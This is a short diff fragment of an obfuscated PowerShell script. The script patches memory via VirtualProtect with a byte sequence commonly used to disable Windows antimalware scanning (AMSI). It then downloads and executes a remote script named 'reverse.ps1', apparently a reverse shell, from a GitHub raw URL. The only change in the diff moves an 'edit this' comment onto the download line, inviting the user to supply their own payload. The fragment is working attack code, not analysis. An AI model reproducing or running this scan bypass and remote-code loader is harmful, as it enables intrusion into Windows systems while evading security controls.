@@ -6,7 +6,6 @@ ${/==\_/=\/\__/\/\/} = 0
 [Win32]::VirtualProtect(${___/====\__/=====}, [uint32]5, 0x40, [ref]${/==\_/=\/\__/\/\/})
 ${_/\__/=\/\___/==\} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy(${_/\__/=\/\___/==\}, 0, ${___/====\__/=====}, 6)
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rikuru-to865/memo/main/reverse.ps1')
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rikuru-to865/memo/main/reverse.ps1')  #←edit this
 
 
-↑edit this
